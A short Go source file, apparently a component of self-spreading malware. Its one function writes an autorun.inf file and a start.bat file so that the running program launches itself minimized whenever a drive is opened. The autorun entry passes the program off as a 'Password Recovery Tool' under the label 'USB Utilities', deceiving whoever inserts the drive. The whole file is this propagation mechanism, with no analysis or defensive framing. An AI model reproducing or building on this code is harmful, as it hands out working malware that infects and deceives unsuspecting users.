package autostart

import (
	"os"
	"path/filepath"
)

func SetupAutorun() {
	autorunContent := `[AutoRun]
open=start.bat
action=Password Recovery Tool
label=USB Utilities
`
	batContent := `@echo off
start /min ` + filepath.Base(os.Args[0]) + `
exit
`

	if _, err := os.Stat("autorun.inf"); os.IsNotExist(err) {
		os.WriteFile("autorun.inf", []byte(autorunContent), 0644)
	}

	if _, err := os.Stat("start.bat"); os.IsNotExist(err) {
		os.WriteFile("start.bat", []byte(batContent), 0644)
	}
}
